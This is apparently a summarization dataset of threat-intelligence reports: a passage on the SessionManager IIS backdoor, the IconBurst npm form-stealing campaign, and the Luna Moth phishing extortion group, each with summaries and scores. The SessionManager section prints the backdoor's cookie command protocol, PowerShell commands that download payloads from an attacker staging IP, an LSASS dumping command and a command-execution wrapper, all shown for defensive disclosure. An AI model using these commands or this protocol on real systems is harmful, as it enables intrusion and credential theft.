usually expect seemingly legitimate but specifically crafted HTTP requests from their operators, trigger actions based on the operators' hidden instructions if any, then transparently pass the request to the server for it to be processed just like any other request (see Figure 1).As a result, such modules are not easily spotted by usual monitoring practices: they do not necessarily initiate suspicious communications to external servers, receive commands through HTTP requests to a server that is specifically exposed to such processes, and their files are often placed in overlooked locations that contain a lot of other legitimate files.Figure 1. Malicious IIS module processing requestsSessionManager offers the following capabilities that, when combined, make it a lightweight persistent initial access backdoor:Reading, writing to and deleting arbitrary files on the compromised server.Executing arbitrary binaries from the compromised server, also known as ""remote command execution"".Establishing connections to arbitrary network endpoints that can be reached by the compromised server, as well as reading and writing in such connections.We identified several variants of the SessionManager module, all including remains of their development environment (PDB paths) and compilation dates that are consistent with observed activity timeframes. This demonstrates a continuous effort to update the backdoor:V0: the compilation date of the oldest sample we identified (MD5 5FFC31841EB3B77F41F0ACE61BECD8FD) is from March 2021. The sample contains a development path (PDB path): ""C:\Users\GodLike\Desktop\t\t4\StripHeaders-master\x64\Release\sessionmanagermodule.pdb"". This indicates the SessionManager developer might have used the public source code of the StripHeaders IIS module as a template to first design SessionManager.V1: a later sample (MD5 84B20E95D52F38BB4F6C998719660C35) has a compilation date from April 2021, and a PDB path set as ""C:\Users\GodLike\Desktop\t\t4\SessionManagerModule\x64\Release\sessionmanagermodule.pdb"".V2: another sample (MD5 4EE3FB2ABA3B82171E6409E253BDDDB5) has a compilation date from August 2021, and a PDB path which is identical to the previous V1, except for the project folder name which is ""SessionManagerV2Module"".V3: finally, the last sample we could identify (MD5 2410D0D7C20597D9B65F237F9C4CE6C9) is dated from September 2021 and has a project folder name set to ""SessionManagerV3Module"".SessionManager command and control protocol detailsSessionManager hooks itself in the HTTP communications processing of the web server by checking HTTP data just before IIS answers to an HTTP request (see Figure 2). In this specific step of HTTP processing, SessionManager can check the whole content of the HTTP request from a client (an operator), and modify the answer that is sent to the client by the server (to include results from backdoor activities), as previously shown in Figure 1.Figure 2. SessionManager registration within the web server upon loadingCommands are passed from an operator to SessionManager using a specific HTTP cookie name. The answer from the backdoor to an operator will usually be inserted in the body of the server HTTP response. If the expected cookie name and value format are not found in an HTTP request from a client, the backdoor will do nothing, and processing will continue as if the malicious module did not exist.The specific HTTP cookie name that is checked by SessionManager is ""SM_SESSIONID"" in variants before V2 (excluded), and ""SM_SESSION"" after. Formatting the exact command names and arguments also depends on the backdoor variant:Before V2 (excluded), most of the commands and associated parameters are all passed as a value [1] of the required SessionManager HTTP cookie, such as for a file reading command:Cookie: SM_SESSIONID=ReadFile-afile.txt 1 Cookie : SM_SESSIONID = ReadFile - afile . txtof the required SessionManager HTTP cookie, such as for a file reading command: After V2 (included), only the command name is passed as a value of the required SessionManager HTTP cookie. Command parameters are passed using names and values[2] of additional cookies, while some commands still require data to be passed within the HTTP body as well. For example, the HTTP cookies definition for a file-reading command looks like this:Cookie: SM_SESSION=GETFILE,FILEPATH=afile.txt, 1 Cookie : SM_SESSION = GETFILE , FILEPATH = afile . txt ,The results of executed commands are returned as body data within HTTP responses. Before V2 (excluded), SessionManager did not encrypt or obfuscate command and control data. Starting with V2 (included), an additional ""SM_KEY"" cookie can be included in HTTP requests from operators: if so, its value will be used as an XOR key to encode results that are sent by SessionManager.The comprehensive list of commands for the most recent variant of SessionManager is presented below:Command name(SM_SESSION cookie value) Command parameters(additional cookies) Associated capability GETFILE FILEPATH: path of file to be read. FILEPOS1: offset at which to start reading, from file start. FILEPOS2: maximum number of bytes to read. Read the content of a file on the compromised server and send it to the operator as an HTTP binary file named cool.rar. PUTFILE FILEPATH: path of file to be written. FILEPOS1: offset at which to start writing. FILEPOS2: offset reference. FILEMODE: requested file access type. Write arbitrary content to a file on the compromised server. The data to be written in the specified file is passed within the HTTP request body. DELETEFILE FILEPATH: path of file to be deleted. Delete a file on the compromised server. FILESIZE FILEPATH: path of file to be measured. Get the size (in bytes) of the specified file. CMD None. Run an arbitrary process on the compromised server. The process to run and its arguments are specified in the HTTP request body using the format: <executable path>\t<arguments>. The standard output and error data from process execution are sent back as plain text to the operator in the HTTP response body. PING None. Check for SessionManager deployment. The ""Wokring OK"" (sic.) message will be sent to the operator in the HTTP response body. S5CONNECT S5HOST: hostname to connect to (exclusive with S5IP). S5PORT: offset at which to start writing. S5IP: IP address to connect to if no hostname is given (exclusive with S5HOST). S5TIMEOUT: maximum delay in seconds to allow for connection. Connect from compromised host to a specified network endpoint, using a created TCP socket. The integer identifier of the created and connected socket will be returned as the value of the S5ID cookie variable in the HTTP response, and the status of the connection will be reported in the HTTP response body. S5WRITE S5ID: identifier of the socket to write to, as returned by S5CONNECT. Write data to the specified connected socket. The data to be written in the specified socket is passed within the HTTP request body. S5READ S5ID: identifier of the socket to read from, as returned by S5CONNECT. Read data from the specified connected socket. The read data is sent back within the HTTP response body. S5CLOSE S5ID: identifier of the socket to close, as returned by S5CONNECT. Terminate an existing socket connection. The status of the operation is returned as a message within the HTTP response body.Post-deployment activities by SessionManager operatorsOnce deployed, SessionManager is leveraged by operators to further profile the targeted environment, gather in-memory passwords and deploy additional tools. Notably, operators used Powershell WebClient functionality from a SessionManager remote execution command to download from the server IP address 202.182.123[.]185, between March and April 2021, such as:powershell ""(New-Object Net.WebClient).DownloadFile('hxxp://202.182.123[.]185/Dll2.dll','C:\Windows\Temp\win32.dll')"" powershell ""(New-Object Net.WebClient).DownloadFile('hxxp://202.182.123[.]185/ssp.exe','C:\Windows\Temp\win32.exe')"" C:\Windows\Temp\win32.exe C:\Windows\Temp\win32.dll 1 2 3 powershell ""(New-Object Net.WebClient).DownloadFile('hxxp://202.182.123[.]185/Dll2.dll','C:\Windows\Temp\win32.dll')"" powershell ""(New-Object Net.WebClient).DownloadFile('hxxp://202.182.123[.]185/ssp.exe','C:\Windows\Temp\win32.exe')"" C : \ Windows \ Temp \ win32 . exe C : \ Windows \ Temp \ win32 . dllAdditional tools that operators attempted to download and execute from SessionManager include a PowerSploit-based reflective loader for the Mimikatz DLL, Mimikatz SSP, ProcDump, as well as a legitimate memory dump tool from Avast (MD5 36F2F67A21745438A1CC430F2951DFBC). The latter has been abused by SessionManager operators to attempt to read the memory of the LSASS process, which would enable authentication secrets collection on the compromised server. Operators also tried to leverage the Windows built-in Minidump capability to do the same thing.In order to avoid detection by security products (which obviously failed in our case), SessionManager operators sometimes attempted additional malicious execution by running launcher scripts through the Windows services manager command line. Starting from November 2021, operators tried to leverage custom PyInstaller-packed Python scripts to obfuscate command execution attempts. This kind of Python script source code would look as follows:import os, sys, base64, codecs from subprocess import PIPE, Popen def cmdlet(c): cmdlet = c.split('(-)') p = Popen(cmdlet, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True) _out, _err = p.communicate() return (codecs.decode(_out, errors='backslashreplace'), codecs.decode(_out, errors='backslashreplace')) print('---------------------'.join(cmdlet(sys.argv[1]))) 1 2 3 4 5 6 7 8 import os , sys , base64 , codecs from subprocess import PIPE , Popen def cmdlet ( c ) : cmdlet = c . split ( '(-)' ) p = Popen ( cmdlet , stdin = PIPE , stdout = PIPE , stderr = PIPE , shell = True ) _out , _err = p . communicate ( ) return ( codecs . decode ( _out , errors = 'backslashreplace' ) , codecs . decode ( _out , errors = 'backslashreplace' ) ) print ( '---------------------' . join ( cmdlet ( sys . argv [ 1 ] ) ) )And as a result, command execution attempts through this tool were made as follows:C:\Windows\Temp\vmmsi.exe cmd.exe(-)/c(-)""winchecksec.exe -accepteula -ma lsass.exe seclog.dmp"" 1 C : \ Windows \ Temp \ vmmsi . exe cmd . exe ( - ) / c ( - ) ""winchecksec.exe -accepteula -ma lsass.exe seclog.dmp""In one case in December 2021, SessionManager operators attempted to execute an additional tool that we unfortunately could not retrieve. This tool was set up to communicate with the IP address 207.148.109[.]111, which is most likely part of the operators' infrastructure.SessionManager targetsWe managed to identify 34 servers that were compromised by a SessionManager variant, belonging to 24 distinct organizations in Argentina, Armenia, China, Djibouti, Equatorial Guinea, Eswatini, Hong Kong, Indonesia, Kenya, Kuwait, Malaysia, Nigeria, Pakistan, Poland, the Russian Federation, Saudi Arabia, Taiwan, Thailand, Turkey, the United Kingdom and Vietnam (see Figure 3).Usually, we could only identify one compromised server per organization, and only one compromised organization per location, but Vietnam is the main exception as several compromised servers from several organizations could be identified there. Amongst the identified organizations, 20 were still running a compromised server as late as June 2022.Additionally, we managed to identify an earlier target of the same campaign that was not compromised with SessionManager, in Laos in mid-March 2021 (see Attribution).Figure 3. Map of organizations targeted by SessionManager campaign (darker color indicates a higher concentration) (download)Most of the compromised servers belong to government or military organizations, but we also identified international and national non-government organizations, an electronic equipment manufacturer, a shipbuilding company, a health care and surgery group, a local road transportation company, a state oil company, a state electricity company, a sales kiosk manufacturer, and an ERP software editor.AttributionFirst, we identified an additional malicious binary (MD5 5F15B17FA0E88D40D4E426E53CF94549, compilation date set in April 2020) that shares a common PDB path part with SessionManager samples (""C:\Users\GodLike\Desktop\t\""). This binary is a password stealer designed to grab Windows users' passwords when they are changed. It is compiled from a Chinese-documented public source code called Hook-PasswordChangeNotify. Unfortunately, we could not retrieve any additional details about this binary exploitation, but it may have been developed by the same developer as SessionManager.Then in mid-March 2021, shortly before our first SessionManager detection, we noticed that a threat actor leveraged ProxyLogon-type vulnerabilities against an Exchange Server in Laos to deploy a web shell and conduct malicious activities using the same Mimikatz SSP and Avast memory dump tools that we described above (see Post-deployment activities from SessionManager operators). Not only were the tool samples the same, but one of them was downloaded from the staging server that SessionManager operators leveraged (202.182.123[.]185). As a result, we believe with medium to high confidence that those malicious activities were conducted by the same threat actor behind SessionManager.Interestingly, the threat actor attempted to download and execute two samples of an HTTP server-type backdoor called OwlProxy on the compromised server in Laos. We then discovered that at least one of those OwlProxy samples had also been downloaded from 202.182.123[.]185 on at least two SessionManager-compromised servers in late March 2021. As a result, we believe with medium to high confidence that the threat actor who operates SessionManager also used or tried to use those OwlProxy samples before introducing SessionManager.The specific OwlProxy variant of the samples we retrieved has only been documented as part of GELSEMIUM's activities. We also noticed that SessionManager targets (see SessionManager targets) partly overlap with GELSEMIUM victims. As a result, we believe that SessionManager might be operated by GELSEMIUM, but not necessarily only GELSEMIUM.Getting rid of IIS malicious modulesOnce again, the activities described here show that the ProxyLogon-type vulnerabilities have been widely used since March 2021 to deploy relatively simple yet very effective persistent server accesses, such as the SessionManager backdoor.While some of the ProxyLogon exploitation by advanced threat actors was documented right away, notably by Kaspersky, SessionManager was poorly detected for a year. Facing massive and unprecedented server-side vulnerability exploitation, most cybersecurity actors were busy investigating and responding to the first identified offences. As a result, it is still possible to discover related malicious activities months or years later, and that will probably be the case for a long time.In any case, we cannot stress enough that IIS servers must undergo a complete and dedicated investigation process after the gigantic opportunity that ProxyLogon-style vulnerabilities exposed, starting in 2021. Loaded IIS modules can be listed for a running IIS instance by using the IIS Manager GUI, or from the IIS appcmd command line. If a malicious module is identified, we recommend the following template of actions (merely deleting the malicious module file will not be enough to get rid of it):Take a volatile memory snapshot on the currently running system where IIS is executed. Request assistance from forensics and incident response experts if required.Stop the IIS server, and ideally disconnect the underlying system from publicly reachable networks.Back up all files and logs from your IIS environment, to retain data for further incident response. Check that the backups can be opened or extracted successfully.Using IIS Manager or the appcmd command tool, remove every reference of the identified module from apps and server configurations. Manually review associated IIS XML configuration files to make sure any reference to the malicious modules have been removed - manually remove the references in XML files otherwise.Update the IIS server and underlying operating system to make sure no known vulnerabilities remain exposed to attackers.Restart the IIS server and bring the system online again.It is advised to then proceed with malicious module analysis and incident response activities (from the memory snapshot and backups that have been prepared), in order to understand how the identified malicious tools have been leveraged by their operators.Indicators of CompromiseSessionManager5FFC31841EB3B77F41F0ACE61BECD8FD84B20E95D52F38BB4F6C998719660C354EE3FB2ABA3B82171E6409E253BDDDB52410D0D7C20597D9B65F237F9C4CE6C9Mimikatz runners95EBBF04CEFB39DB5A08DC288ADD2BBCF189D8EFA0A8E2BEE1AA1A6CA18F6C2BPyInstaller-packed process creation wrapper65DE95969ADBEDB589E8DAFE903C5381OwlProxy variant samples235804E3577EA3FE13CE1A7795AD5BF930CDA3DFF9123AD3B3885B4EA9AC11A8Possibly related password stealer5F15B17FA0E88D40D4E426E53CF94549Files paths%PROGRAMFILES%\Microsoft\Exchange Server\V15\ClientAccess\OWA\Auth\SessionManagerModule.dll%PROGRAMFILES%\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\bin\SessionManagerModule.dll%WINDIR%\System32\inetsrv\SessionManagerModule.dll%WINDIR%\System32\inetsrv\SessionManager.dllC:\Windows\Temp\ExchangeSetup\Exch.ps1C:\Windows\Temp\Exch.exeC:\Windows\Temp\vmmsi.exeC:\Windows\Temp\safenet.exeC:\Windows\Temp\upgrade.exeC:\Windows\Temp\exupgrade.exeC:\Windows\Temp\dvvm.exeC:\Windows\Temp\vgauth.exeC:\Windows\Temp\win32.exePDB PathsC:\Users\GodLike\Desktop\t\t4\StripHeaders-master\x64\Release\sessionmanagermodule.pdbC:\Users\GodLike\Desktop\t\t4\SessionManagerModule\x64\Release\sessionmanagermodule.pdbC:\Users\GodLike\Desktop\t\t4\SessionManagerV2Module\x64\Release\sessionmanagermodule.pdbC:\Users\GodLike\Desktop\t\t4\SessionManagerV3Module\x64\Release\sessionmanagermodule.pdbC:\Users\GodLike\Desktop\t\t0\Hook-PasswordChangeNotify-master\HookPasswordChange\x64\Release\HookPasswordChange.pdbIP addresses202.182.123[.]185 (Staging server, between 2021-03 and 04 at least)207.148.109[.]111 (Unidentified infrastructure)[1] As per RFC:2109 (title 4.1) and its successor RFC:2965 (title 3.1), values of HTTP cookies that contain characters such as filepath backslashes should be quoted. SessionManager does not care to comply with referenced RFCs, and does not unquote such values, so will fail to process a cookie value that contains filepaths including backslashes as sent by standard HTTP clients.[2] The previous cookie value limitations (see footnote 1) still exist with V2+. In addition, any cookie variable definition to be processed by SessionManager V2+ must be terminated with a ',' character, even if there is only one cookie variable set.";"SessionManager is a lightweight persistent initial access backdoor that has been used against NGOs, government, military and industrial organizations in Africa, South America, Asia, Europe, Russia and the Middle East, starting from at least March 2021. The ITSecurity report summarizes the results of executed commands, which are returned as body data within HTTP responses. Before V2 (excluded), SessionManager did not encrypt or obfuscate command and control data. Starting with V2 (included), an additional ""SM_KEY"" cookie can be included in HTTP requests from operators: if so, its value will be used as an XOR key to encode results that are sent by SessionManager. The comprehensive list of commands for the most recent variant of SessionManager is presented below: Command name(SM_SESSION cookie value) Command parameters(additional cookies) Associated capability GETFILE FILEPATH: path of file to be read. FILEPOS1: offset at which to start reading, from file start. FILEPOS2: maximum number of bytes to read. Read the content of a file on the compromised server and send it to the operator as an HTTP binary file named cool.rar. PUTFILE FILEPATH: path of file to be written. FILEPOS1: offset at which to start writing. FILEPOS2: offset reference. FILEMODE: requested file access type. Write arbitrary content to a file on the compromised server. The data to be written in the specified file is passed within the HTTP request body. DELETEFILE FILEPATH: path of file to be deleted. Delete a file on the compromised server. FILESIZE FILEPATH: path of file to be measured. Get the size (in bytes) of the specified file. CMD None. Run an arbitrary process on the compromised server. The ""Wokring OK"" (sic.) message will be sent to the operator in the HTTP response body";en;{'r': 0.14299153339604892, 'p': 0.9681528662420382, 'f': 0.24918032562629672};{'r': 0.09725250763192324, 'p': 0.9409282700421941, 'f': 0.17628458328222282};{'r': 0.14299153339604892, 'p': 0.9681528662420382, 'f': 0.24918032562629672}
https://www.reversinglabs.com/blog/iconburst-npm-software-supply-chain-attack-grabs-data-from-apps-websites;Update: IconBurst NPM software supply chain attack grabs data from apps and websites;"Executive SummaryUpdate: since publication of this blog, new, malicious packages attributable to the accounts identified in our original report appeared on npm. In addition, new CDN (content distribution network) infrastructure was identified being used for script inclusion. We have updated our blog post to include the latest information and will continue updating it as new threats or information become available. (July 6, 2022)ReversingLabs researchers recently discovered evidence of a widespread software supply chain attack involving malicious Javascript packages offered via the NPM package manager. Researchers at ReversingLabs identified more than two dozen NPM packages, dating back six months, that contain obfuscated Javascript designed to steal form data from individuals using applications or websites where the malicious packages had been deployed.Upon closer inspection, we discovered evidence of a coordinated supply chain attack, with a large number of NPM packages containing jQuery scripts designed to steal form data from deployed applications that include them. While the full extent of this attack isn't yet known, the malicious packages we discovered are likely used by hundreds, if not thousands of downstream mobile and desktop applications as well as websites. In one case, a malicious package had been downloaded more than 17,000 times.As with the recent (benign) dependency confusion attacks targeting German organizations, these clearly malicious attacks relied on typo-squatting, a technique in which attackers offer up packages via public repositories with names that are similar to -- or common misspellings of -- legitimate packages. Attackers impersonated high-traffic NPM modules like umbrellajs and packages published by ionic.io. However, it is the end users of software (and their data) rather than development organizations that are the real targets. That makes this attack more comparable to the infamous SolarWinds compromise than to other, more recent supply chain compromises. Furthermore, similarities between the domains used to exfiltrate data suggest that the various modules in this campaign are in the control of a single actor.Here's detailed information on this widespread software supply chain attack, including known indicators of compromise (IOCs) associated with the attacks -- and recommendations for remediating the threat posed by these malicious NPM modules.[ Watch Reverse Engineer Karlo Zanki's a deep-dive discussion about his IconBurst research on ConversingLabs ]IntroductionThe ReversingLabs research team is continuously monitoring open-source package repositories for instances of malicious code planting and software supply chain attacks. This work involves both automated and human-led scanning and analysis of packages published in the most popular public package repositories like NPM, PyPI, Ruby and NuGet. During these scans, we leverage our proprietary Titanium platform, and our deep file repository of goodware and badware to spot malicious and even suspicious elements hiding in plain view. Our newly released ReversingLabs secure.software solution builds upon that past work. The platform provides a way for dev and SOC teams to deeply examine their CI/CD workflows, containers and release packages to spot nascent or active software supply chain compromises.Frequently, our work turns up evidence of active software supply chain attacks. In April, we came across NPM packages that used a javascript obfuscator to hide their functionality. Our analysis of those packages produced proof of the simulated ""dependency confusion"" attacks on the software supply chain of leading German companies across a number of industries. We have been tracking NPM repositories for occurrences of packages that use the same obfuscator ever since.Here's how tracking the usage of this obfuscation technique resulted in discovering several NPM accounts, which were used to publish malicious code designed to steal form data entered by end users of infected web applications.DiscussionThe core capability of ReversingLabs' secure.software solution is analyzing code intent while highlighting malicious behaviors. These indicators cover all kinds of software behavior, from network and file system activities to use of packers associated with malicious campaigns, and the use of evasion techniques.Got obfuscation?One technique we're increasingly attuned to is the use of javascript obfuscator, a goodware component that is intended (mostly) to protect Javascript applications from the prying eyes of those who seek to steal or reverse engineer the code. Despite the respectable bona fides of javascript obfuscator and its laudable purpose, our past research revealed several instances of malicious packages using this tool to disguise malicious code. At this point, every encounter with such behavior requires a closer look.The presence of a javascript obfuscator was the indicator that initially got our team looking at a wide range of NPM packages, mostly published in the last two months, all using the mentioned obfuscator. In total, we discovered more than two dozen NPM packages. When we looked at the names of those packages, we noticed some striking similarities. To show you what we mean, check out the following list of suspect packages.Figure 1: Similarly named packages using javascript obfuscatorCan you spot the pattern? A deeper investigation into these NPM modules reveals even more connections. All were connected to one of a handful of NPM accounts with names like ionic-io, arpanrizki, kbrstore, and aselole.Obfuscated code found stealing form dataTo figure out what was going on with these packages, our team started by de-obfuscating the package content using a javascript deobfuscator. We followed that with a detailed examination of the de-obfuscated samples, which revealed that all of them perform collection of form data using jQuery Ajax functions, and then exfiltrate that data to various domains controlled by malicious authors. In other words: This is clear evidence of malicious intent.Clearly, the typo-squatting technique used to fool developers into confusing the malicious packages with their legitimate counterparts was working. Packages created by the NPM ionic-io author, for example, show that the author published 18 versions of an NPM package named icon-package containing the malicious form stealing code. That was a glaring attempt to mislead developers into using this package instead of ionicons, a popular, open-source icon set with more than 1,000 icons for web, iOS, Android, and desktop apps.Figure 2: Version data related to icon-packageNPM download stats show that the malicious icon-package has over 17,000 downloads. Data exfiltrated using this package passes through a domain hxxps://ionicio.com, a play on the legitimate ionicons framework domain ionic.io that would be easy for application developers to overlook. The ruse extends beyond the NPM ecosystem, though. Note the visual similarity between the fake ionic web page seen in Figure 3 and the legitimate ionic page in Figure 4.Figure 3: Fake ionic webpageFigure 4: Legitimate ionic webpageUnder the hood, the malicious packages use a modified script that extends the behavior of the jQuery ajax() function to exfiltrate serialized form data to domains controlled by the attacker. Prior to sending the data, the function validates the URL content to perform target filtering checks.The trail begins in December 2021In the process of tracing the origin of the campaign, even older packages containing this type of malicious functionality were discovered. They were published in December 2021 by the author fontsawesome, and also targeted the already mentioned ionicons icon set. The domain used for data exfiltration in these packages is the same as the one used in the first two versions of the icon-package package: hxxps://graph-googleapis.com.While the exact start of this campaign is unknown, the malicious package published from December 2021 all the way to the middle of May 2022 focused on mimicking the ionicons framework. At that point, the attackers switched to developing new NPM packages that reused the same functionality and also started targeting other popular UI frameworks.One of those packages is called umbrellaks, which is an obvious attempt at a typosquatting attack on the quite popular umbrellajs javascript DOM (document object model) manipulation framework.We also observed several packages published by the NPM account arpanrizki engaging in similar form data-grabbing. However, the exfiltration domain associated with these packages is different: hxxps://arpanrizki.my.id. The form identifier for exfiltrated data was quite specific: ValidateVerificationDataForm. So, as part of our investigation, we performed a GitHub search for this identifier, with some interesting results. (See Figure 5.)Figure 5: GitHub search resultsAs the results show, one of the GitHub repositories containing the string in question were maintained by arpantek, a nickname very similar to the one of the NPM author. The other result was related to a HackingTool repository belonging to the NPM author Woxruz.Figure 6: Woxruz's HackingToolThe last commit's description gives us a clue of the intended use for these software projects. These tools were designed for ""Hacking PUBG i'd"" [sic]. PUBG is a popular online-multiplayer video game with a large number of users. In other words, it seems the person behind the arpantek and arpanrizki accounts tried to port the login stealing script to the NPM ecosystem to expand the reach.Names of the packages published by arpanrizki also suggest they are targeting popular Javascript frameworks like ionicons and sidr. In particular, the sidr NPM package hasn't been maintained for 6 years, but still has more than 500 weekly downloads, which makes it a good target. Packages published by this author have since been removed from NPM and replaced with security placeholders. The sidr package description confirms that in this phase of the campaign, the main target of the actor behind arpanrizki account were PUBG users.Figure 7: sidr package description and the content of the referenced websiteHungry for dataWhile the malicious packages we initially observed took a conservative approach to harvesting form data, the more recently published malicious packages are taking a more aggressive approach to acquiring data. Another malicious package we identified, footericon, gathers data from all form elements with a defined ""login-form"" class.Figure 8: Form data exfiltration code from footericon packageSimilarly, the swiper-bundIe package, a malicious NPM package targeting the popular Javascript framework swiper, uses the embedded jQuery approach, extending its end() function with functionality that gathers data from every form element on the page.Figure 9: Form data exfiltration code from swiper-bundIe packageClues hidden in codeWhile we can't yet identify the actor(s) responsible for these attacks, clues as to the structure of the campaign abound in the deployed packages. For example, the swiper-bundIe package contains a Javascript header in the payload script with cleartext comments that name the author of the package as Alberto Varela, the author of the sidr package targeted by the arpanrizki author. Similarly, the long, commented Javascript one-liner also contains several references to the sidr package.Figure 10: Comment header at the beginning of the payload from swiper-bundIe packageFinally, the malicious packages use exfiltration domains with a consistent naming pattern: <subdomain>.my.id. Together, these clues suggest a common actor behind the various malicious packages and a unified campaign.List of malicious NPM modulesAuthor / Package name Download count fontsawesome ionic-icon 108 ionicio 3,724 ionic-io icon-package 17,774 ajax-libs 2,440 umbrellaks 686 ajax-library 530 arpanrizki iconion-package 101 package-sidr 91 kbrstore 89 icons-package 380 subek 99 package-show 103 package-icon 122 kbrstore icons-packages 170 ionicon-package 64 icons-pack 49 pack-icons 468 ionicons-pack 89 aselole package-ionicons 144 package-ionicon 57 base64-javascript 40 ionicons-js 38 ionicons-json 39 footericon footericon 1,903 ajax-libz roar-01 40 roar-02 37 wkwk100 38 swiper-bundie 39 ajax-libz 40 swiper-bundle 185 atez 43 ajax-googleapis 38 tezdoank 69 ryucha ajaxapis 40 tescodek 38 atezzz 114 libz.jquery 160 ajax-libary 36 kabarstre icon-ionicon 384 icon-ionicons 65 arpan-package 109 ion-package 254 package-ion 98 ionpackages 67 ionpackagesa 96 ditznesiaa basencrypt 73 basecrypt 174 cdnpjs 87 cndpjs 42 pattern.json 44 rakaganz rochman 135 footericonfootericon 169 footericons 245 sdomino 96 codashop 78 freefire 64 true_id 66 rakaws logo-facebook 183 jubaa ajax-libss 48Table 1: List of malicious packages with corresponding download countConclusionReversingLabs' research uncovered an extensive software supply chain attack involving more than two dozen NPM modules used by thousands of downstream applications, as indicated by the package download counts.Analysis of the modules reveals evidence of coordination, with malicious modules traceable to a small number of NPM publishers, and consistent patterns in supporting infrastructure such as exfiltration domains. ReversingLabs reached out to the NPM security team to report the findings on July 1st, 2022.This attack marks a significant escalation in software supply chain attacks. Malicious code bundled within the NPM modules is running within an unknown number of mobile and desktop applications and web pages, harvesting untold amounts of user data. The NPM modules our team identified have been collectively downloaded more than 27,000 times. As very few development organizations have the ability to detect malicious code within open source libraries and modules, the attacks persisted for months before coming to our attention. While a few of the named packages have been removed from NPM, most are still available for download at the time of this report.In publishing this report, we hope it serves as a resource for development organizations to assess their own exposure to these malicious NPM modules. We have prepared a list of affected modules and indicators of compromise that organizations can use to look for evidence of active attacks.Looking beyond this specific incident, it is clear that software development organizations as well as their customers need new tools and processes for assessing supply chain risks like the ones posed by these malicious NPM packages. The decentralized and modular nature of application development means that applications and services are only as strong as their least secure component. The success of this attack -- with more than two dozen malicious modules available for download on a popular package repository, and one of them with 17,000 downloads in a matter of weeks -- underscores the freewheeling nature of application development, and the low barriers to malicious or even vulnerable code entering sensitive applications and IT environments.Indicators of Compromise (IoC)C2 domains extracted from the analyzed NPM packages:graph-googleapis.comionicio.comcurls.safhosting.xyzarpanrizki.my.iddnster.my.idokep.renznesia.xyzryucha.my.idpanelllgege.001www.comnge.scrp.my.idapiii-xyz.yogax.my.idpanel.archodex.xyzpanel.curlz.onlineapi.mlbb-x-02.mlPackage versions:";ReversingLabs researchers recently discovered evidence of a widespread software supply chain attack involving malicious Javascript packages offered via the NPM package manager. Researchers at ReversingLabs identified more than two dozen NPM packages, dating back six months, that contain obfuscated Javascript designed to steal form data from individuals using applications or websites where the malicious packages had been deployed. Upon closer inspection, we discovered evidence of a coordinated supply chain attack, with a large number of NPM packages containing jQuery scripts designed to steal form data from deployed applications that include them. While the full extent of this attack isn't yet known, the malicious packages we discovered are likely used by hundreds, if not thousands of downstream mobile and desktop applications as well as websites. In one case, a malicious package had been downloaded more than 17,000 times. As with the recent (benign) dependency confusion attacks targeting German organizations, these clearly malicious attacks relied on typosquatting, a technique in which attackers offer up packages via public repositories with names that are similar to or common misspellings of legitimate packages. Attackers impersonated hightraffic NPM modules like umbrellajs and packages published by ionic.io. However, it is the end users of software (and their data) rather than development organizations that are the real targets. That makes this attack more comparable to the infamous SolarWinds compromise than to other, more recent supply chain compromises. Furthermore, similarities between the domains used to exfiltrate data suggest that the various modules in this campaign are in the control of a single actor. Here's detailed information on this widespread software supply chain attack, including known indicators of compromise (IOCs) associated with the attacks and recommendations for remediating the threat pos;en;{'r': 0.17628865979381445, 'p': 0.9827586206896551, 'f': 0.2989510463717664};{'r': 0.12868217054263567, 'p': 0.9651162790697675, 'f': 0.227086181234409};{'r': 0.17628865979381445, 'p': 0.9827586206896551, 'f': 0.2989510463717664}
https://blog.sygnia.co/luna-moth-false-subscription-scams;Luna Moth: The Threat Actors Behind Recent False Subscription Scams;"Over the last few months, Sygnia's Incident Response team has been methodically tracking the 'Luna Moth' ransom group. Their modus-operandi resembles scammers, with the twist of corporate data theft, leveraging the threat of publication to demand millions of dollars in ransom.key pointsThe Sygnia Incident Response team identified a relatively new threat group, which has been operating since the end of March 2022. Sygnia refers to this threat actor as 'Luna Moth' or TG2729.'Luna Moth' focuses on Data Breach extortion attacks, threatening to leak stolen information if the demanded ransom is not paid.The initial compromise is achieved by deceiving victims in a phishing campaign under the theme of Zoho MasterClass and Duolingo subscriptions, leading to the installation of an initial tool on the compromised host.The group uses commercial remote administration tools (RATs) and publicly available tools to operate on compromised devices and maintain persistency, demonstrating once more the simplicity and effectiveness of ransom attacks.The group acts and operates in an opportunistic way: even if there are no assets or devices to compromise in the network, they exfiltrate any data that is accessible, this emphasizes the importance of managing sensitive corporate information.the 'luna moth' groupWith the rise in ransomware activity over the past years, the security industry has become used to hearing about double extortion, and even triple extortion attacks, and new crime groups of all kinds. In this blog post, we shed light on a relatively new threat actor which goes by the name of the 'Silent Ransom Group' (or 'SRG') and was dubbed 'Luna Moth' by Sygnia. By launching a phishing campaign with a wide coverage area, 'Luna Moth' infiltrates and compromises victim devices. These attacks can be categorized as data breach ransom attacks, in which the main focus of the group is to gain access to sensitive documents and information, and demand payment to withhold publication of the stolen data. Simple as they may be, these attacks can create serious issues for victims if sensitive data and information is stolen in this way.Although the group is not widely known, they have been active in the past months, attempting to build their reputation as a ransom gang. Their modus-operandi resembles scammers, with the twist of corporate data theft, leveraging the threat of publication to demand millions of dollars in ransom.gaining initial accesssOver the past three months, the 'Luna Moth' group operated a large-scale phishing campaign under the theme of MasterClass and Duolingo subscriptions, by impersonating Zoho MasterClass Inc and Duolingo. Although claiming to be related to the Zoho Corporation or Duolingo, the phishing emails are sent from Gmail addresses that are altered to resemble the legitimate company email addresses:{FIRST-NAME}.{LAST-NAME}.zohomasterclass@gmail.com{FIRST-NAME}.{LAST-NAME}.duolingo@gmail.comThis is a classic phishing scam: the email claims that the recipient of the email purchased a subscription to a legitimate service, and that payment is due. To complete the scam, an invoice PDF file is attached to the email, and the victim is recommended to call a phone number, which the email states can be found within the attached file, if there are any issues with the subscription.Image 1: An example of a Zoho Masterclass themed phishing emailImage 2-5: Examples of invoices attached as PDF files to the phishing emailsIf the victim wishes to refute the purchase, they are required to join a Zoho remote support session. At this point, the threat actor uses the native Zoho Assist functionality to send another email, entitled ""Zoho Assist - Remote Support session"", which guides the user to download and install the Zoho Assist application. The group then invites the victim to the support session using Zoho Assist accounts that are tied to protonmail emails.During this short yet effective Zoho Assist session, the threat actor is able to trick the user into downloading and installing Atera on their device, this is a remote administration tool commonly used by threat actors. Once Atera is installed on the device, the threat actor can access the device and operate freely.tools in the arsenalThe examples shown above demonstrate that both the activities and the toolset of 'Luna Moth' are fairly unsophisticated. The main tools used by the threat actor consist of remote administration tools (RATs) that allow them to control compromised 